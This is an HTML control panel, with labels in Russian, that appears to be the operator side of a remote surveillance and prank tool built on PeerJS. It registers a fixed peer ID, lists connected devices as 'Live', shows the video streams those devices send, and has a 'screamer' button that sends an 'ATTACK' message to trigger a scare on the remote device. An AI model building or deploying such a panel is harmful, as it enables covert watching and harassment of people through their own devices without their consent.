<!DOCTYPE html>
<html>
<head>
    <title>Панель Управления</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #0b0b0b; color: white; font-family: sans-serif; margin: 0; display: flex; height: 100vh; }
        .sidebar { width: 250px; background: #151515; border-right: 1px solid #333; padding: 20px; }
        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        video { width: 45%; border: 2px solid #ff0050; border-radius: 10px; margin: 5px; background: #000; }
        .btn-attack { background: #ff0050; color: white; border: none; padding: 20px; width: 100%; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3>Устройства (Live)</h3>
        <div id="users">Ожидание...</div>
        <button class="btn-attack" onclick="sendAttack()">⚡ СКРИМЕР ⚡</button>
    </div>
    <div class="main">
        <h2 id="status">ТРАНСЛЯЦИЯ</h2>
        <div id="video-container" style="display: flex; flex-wrap: wrap; justify-content: center;"></div>
    </div>

    <script>
        const MY_ID = '09062012';
        const peer = new Peer(MY_ID);
        let activeConn = null;

        peer.on('connection', conn => {
            activeConn = conn;
            document.getElementById('users').innerHTML = `<div style="color:#0f0">● ONLINE [${conn.peer.substring(0,5)}]</div>`;
        });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                let video = document.createElement('video');
                video.autoplay = true;
                video.playsinline = true;
                video.srcObject = stream;
                document.getElementById('video-container').appendChild(video);
            });
        });

        function sendAttack() {
            if (activeConn) activeConn.send('ATTACK');
        }
    </script>
</body>
</html>
